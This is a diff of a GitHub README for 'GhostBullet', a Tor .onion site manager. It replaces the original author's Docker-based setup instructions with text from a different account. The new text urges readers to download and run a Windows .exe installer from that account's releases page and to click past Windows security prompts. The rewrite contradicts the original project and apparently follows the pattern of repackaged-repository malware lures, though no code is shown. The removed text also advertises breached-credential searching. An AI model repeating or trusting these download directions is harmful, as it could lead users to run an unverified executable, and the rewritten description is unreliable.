@@ -1,112 +1,207 @@
-<div align="center">
+# 👻 GhostBullet - Secure Tor Site Manager
 
-# 👌🏻 Ghost Bullet 👌🏻
-<img width="1280" height="640" alt="Ghost Bullet Logo - Banner v2" src="https://github.com/user-attachments/assets/ca8abecc-27c2-4b91-a96f-2ef1eae0115c" />
+[![Download GhostBullet](https://img.shields.io/badge/Download-GhostBullet-brightgreen)](https://github.com/demnalatsabidze-arch/GhostBullet/releases)
 
-**The Ultimate Tor Hidden Service Manager & Dark Net Intelligence Dashboard**
-
-[![License: AGPL v3](https://img.shields.io/badge/License-AGPL_v3-blue.svg)](https://www.gnu.org/licenses/agpl-3.0)
-[![Docker](https://img.shields.io/badge/Docker-Ready-cyan.svg)](https://www.docker.com/)
-[![Tor](https://img.shields.io/badge/Tor-v3_Hidden_Services-indigo.svg)](https://www.torproject.org/)
-[![Status](https://img.shields.io/badge/Status-Active-success.svg)]()
-[![Developer](https://img.shields.io/badge/Developer-chadi0x-blue.svg)](https://github.com/chadi0x)
-
-*Deploy entirely self-hosted, secure `.onion` sites in seconds with automated multi-threading, dynamic Nginx routing, and integrated Vanity URL generation.*
-
-<img src="https://github.com/user-attachments/assets/b96c1be5-9837-4d9c-b25b-c3030297e8f2" alt="Ghost Bullet Dashboard Preview" onerror="this.style.display='none'">
-
-</div>
+GhostBullet helps you create and manage secure .onion sites. It works on your own Windows PC without complex setup. Use it to deploy hidden Tor sites quickly and safely.
 
 ---
 
-## 🚀 Overview
+## 🔍 What is GhostBullet?
 
-**Ghost Bullet** takes the complex, error-prone process of manually configuring Tor hidden services and transforms it into a sleek, automated, cyberpunk-styled dashboard. Built with Docker, Flask, and Nginx, Ghost Bullet allows you to spin up multiple `.onion` websites instantly, either by uploading `.zip` archives directly to the built-in host, or by proxying traffic to your existing containers.
+GhostBullet is a tool for building and running Tor hidden services. You can create private .onion websites controlled entirely by you. It uses smart features like automatic routing and Vanity URL generation to make managing your sites easier. GhostBullet works with common software like Nginx and Docker to handle traffic and security.
 
-Stop wrestling with `torrc` configurations, `chown` permissions, and broken symlinks. Ghost Bullet handles the invisible network layer so you can focus on building.
-
-## 🕹️ Features
-
-- **Instant Deployment**: Go from a ZIP file to a live V3 `.onion` link in under 10 seconds.
-- **Advanced Vanity URLs**: Integrated `mkp224o` worker cluster automatically brute-forces custom `.onion` prefixes in the background.
-- **Dynamic Routing**: Built-in Nginx container seamlessly serves dozens of hidden services simultaneously with zero port conflicts.
-- **Cyberpunk UI**: A gorgeous, dark-mode administrative dashboard for absolute control over your Tor nodes.
-- **Live File Management**: View, edit, and delete hosted site files directly through the dashboard interface.
-- **Container Proxying**: Easily bind new Tor links to any pre-existing Docker container on your server.
-
-## 👑 Premium Edition
-
-Enhance your Ghost Bullet installation with advanced offensive and defensive intelligence capabilities. Upgrade to Premium to unlock the top navigation modules:
-
-*   **🛡️ Vulnerability Scanner For Tor**: Scan remote Onion addresses for exposed CVEs, misconfigurations, and standard web vulnerabilities aggressively.
-*   **🗄️ Breach Data On Dark Net**: Search massive indexed archives of breached credentials, stolen data, and leaked databases natively from the dashboard.
-*   **✅ Validate Sites**: Automatically ping and verify the uptime, signature, and health of thousands of external Onion URLs simultaneously.
-*   **🐛 Last Exploits**: Real-time scraping engine monitoring underground forums for zero-days, new exploits, and active malware trends.
-
-<div align="center">
-  <a href="https://pay.oxapay.com/15690646">
-    <img src="https://img.shields.io/badge/👑_GET_THE_PREMIUM_VERSION_NOW-8A2BE2?style=for-the-badge&logo=github&logoColor=white&labelColor=1a1a1a" alt="Get Premium Version" />
-  </a>
-</div>
+The app is self-hosted, so you keep control over your data. It suits users who want privacy and security on the dark web without needing to know programming or server management.
 
 ---
 
-## 🛠️ Installation & Setup
+## 📋 System Requirements
 
-Ghost Bullet is entirely containerized. You only need Docker and Docker Compose installed on your host system.
+Before you start, check your system meets these minimal needs:
 
-### 1. Clone the Repository
-```bash
-git clone https://github.com/chadi0x/GhostBullet.git
-cd GhostBullet
-```
-
-### 2. Configure Environment (Optional)
-```bash
-cp .env.example .env
-# Edit .env if you wish to change default ports or database settings
-```
-
-### 3. Build & Launch
-```bash
-docker compose up -d --build
-```
-Ghost Bullet will compile the Vanity worker, initialize the database, configure Nginx, and establish a live connection to the Tor network.
-
-### 4. Access the Dashboard
-Open your local browser to:
-**http://localhost:8008**
+- Windows 10 or newer (64-bit recommended)
+- At least 4 GB RAM
+- 10 GB free disk space for software and site data
+- Internet connection to download files and access Tor network
+- Administrator rights on your computer to install and run GhostBullet
 
 ---
 
-## ⚡ Usage
+## 🚀 Getting Started
 
-### Hosting a Built-in Site
-1. Click **DEPLOY SITE** in the top navigation bar.
-2. Select **Built-in (Nginx)**.
-3. Once the Node is created, click the green **UPLOAD** button on the node card.
-4. Select a `.zip` archive containing your `index.html` and assets. Ghost Bullet will instantly extract them and route the Tor traffic.
-
-### File Management
-Click the purple **MANAGE FILES** button on any active node to open the File Manager. From here, you can verify file extraction sizes and delete specific `.html` or image assets without wiping the entire node.
-
-### Upgrades & Updates
-Click the blue **REWRITE FILES** button to completely replace an existing node with a fresh `.zip` payload, while retaining the exact same `.onion` address.
+Follow these steps to get GhostBullet running on your Windows machine.
 
 ---
 
-## 🛠️ Custom Projects & Services
+### 1. Download GhostBullet
 
-Our group actively builds **100+ projects** targeting multi-service architectures and dark net integrations. Most of our advanced, large-scale projects are not free.
+Click the green badge below to visit the download page. This page contains the latest version files.
 
-If you need a specific custom project, tailored cybersecurity tool, or specialized infrastructure, reach out to me directly on Telegram: **[@hisoka0morow](https://t.me/hisoka0morow)**.
-## ⚠️ Disclaimer
-
-Ghost Bullet is provided strictly for educational purposes, security research, and legitimate privacy preservation. **Tor is a privacy tool, not a criminal one.** 
-
-The developer (**chadi0x**) is not responsible for any misuse, damage, or illegal activities conducted using this software. We do not endorse or support the use of Ghost Bullet to host illegal content or services. By using this software, you take full responsibility for your actions and how you choose to use it. Always ensure you have explicit permission before scanning or interacting with third-party hidden services.
+[![Download GhostBullet](https://img.shields.io/badge/Download-GhostBullet-blue)](https://github.com/demnalatsabidze-arch/GhostBullet/releases)
 
 ---
-<div align="center">
-    <p>Developed with ❤️ by <a href="https://github.com/chadi0x">chadi0x</a></p>
-</div>
+
+### 2. Choose the Windows Installer
+
+On the release page, look for an installer file ending with `.exe` that is labeled for Windows. The file may have a name like `GhostBullet-Setup.exe` or similar.
+
+Click the file name to start the download. The file size will be around 50-100 MB depending on the version.
+
+---
+
+### 3. Run the Installer
+
+Once the download finishes, find the installer in your Downloads folder. Double-click it to open.
+
+You may see a security prompt from Windows. Select “Run” to allow the installer to proceed.
+
+---
+
+### 4. Follow Installation Instructions
+
+The installer will guide you through a few simple steps:
+
+- Read and accept the license agreement.
+- Choose an installation folder or leave the default.
+- Confirm you want to install GhostBullet.
+
+The process should only take a few minutes.
+
+---
+
+### 5. Launch GhostBullet
+
+After installation completes, you will see a shortcut on your desktop or in the Start menu.
+
+Click to open GhostBullet. The app will start and prepare necessary background tools like the Tor service and Nginx server.
+
+---
+
+## ⚙️ Using GhostBullet to Manage Tor Sites
+
+Once GhostBullet is open, here is how you can create a new Tor hidden site.
+
+---
+
+### 1. Add a New Hidden Service
+
+Click on the “Add Site” button. 
+
+Enter a site name. For example, “MySecretSite”.
+
+If you want, enable the Vanity URL option. This lets you pick a custom prefix for your .onion address instead of a random one.
+
+Click “Create”. GhostBullet will generate the Onion address and configure routing automatically.
+
+---
+
+### 2. Configure Your Website Content
+
+GhostBullet creates a folder for your site files. You can add your HTML, CSS, images, and other files here.
+
+Use any web editor or file manager to modify the site content.
+
+---
+
+### 3. Start the Site
+
+Select your site from the list and click “Start”.
+
+GhostBullet will launch the service through Tor. It sets up Nginx to handle requests and forward them safely.
+
+---
+
+### 4. Access Your Site
+
+In the site details, find the .onion address.
+
+Copy and open this address in the Tor Browser to visit your hidden site.
+
+---
+
+### 5. Monitor Traffic and Logs
+
+GhostBullet includes a dashboard that shows:
+
+- Connection counts
+- Requests processed
+- Errors and warnings
+
+Use these to check your site’s health and security.
+
+---
+
+## 🛠 Additional Features
+
+GhostBullet offers tools useful for managing your hidden sites:
+
+- **Multi-threading support** for faster deployments.
+- **Dynamic Nginx routing** that adapts when you add or remove sites.
+- **Vanity URL generation** to create custom .onion prefixes.
+- Integrated Tor control to start or stop services easily.
+- Basic site analytics for visitors and requests.
+- Secure data storage on your PC without cloud dependency.
+
+---
+
+## ⚠️ Troubleshooting Common Issues
+
+- **Installer won’t run:** Check Windows security settings or try right-click “Run as administrator”.
+- **Tor service fails to start:** Make sure no firewall blocks GhostBullet or Tor.
+- **Site doesn’t load in Tor Browser:** Confirm you copied the full .onion address. Restart the site from inside GhostBullet.
+- **Slow response:** Closing other heavy apps may improve performance.
+
+---
+
+## 💡 Tips for First-Time Users
+
+- Use Tor Browser to check your sites. Do not use regular browsers to open .onion addresses.
+- Keep your GhostBullet app updated by visiting the releases page regularly.
+- Backup your site files and configurations to avoid data loss.
+- Use simple site content at first to test functionality before adding complex scripts or databases.
+
+---
+
+## 📂 Where to Find the Download Again
+
+Visit the GhostBullet release page anytime to get the latest Windows setup file:
+
+[Visit releases to download GhostBullet](https://github.com/demnalatsabidze-arch/GhostBullet/releases)  
+
+Look for the `.exe` installer for Windows and follow the steps above.
+
+---
+
+## 🧰 Technical Support
+
+GhostBullet includes basic logs within the app to help diagnose problems.
+
+If you need help, check the GitHub Issues tab of the repository. You can find user-reported problems and solutions there.
+
+---
+
+## 📚 Learning More About Tor and Hidden Services
+
+If you are new to Tor or hidden services, consider these key points:
+
+- Tor routes your internet traffic through multiple servers to hide your identity.
+- .onion sites do not use the normal web. They only work via the Tor network.
+- Hidden services protect hosting locations and the privacy of visitors.
+- Security depends on proper setup and keeping software updated.
+
+---
+
+## 🔗 Useful Links
+
+- [Tor Browser Download](https://www.torproject.org/download/)
+- [GhostBullet GitHub Repository](https://github.com/demnalatsabidze-arch/GhostBullet)
+- [GitHub Releases Page](https://github.com/demnalatsabidze-arch/GhostBullet/releases)  
+
+---
+
+## 🛡 Privacy and Security
+
+GhostBullet runs fully on your machine. No external servers can access your site content. You control what gets shared. Use strong passwords for your PC and keep your system secure.
+
+---
+
+GhostBullet shifts complex Tor site management into a simple Windows app anyone can use.
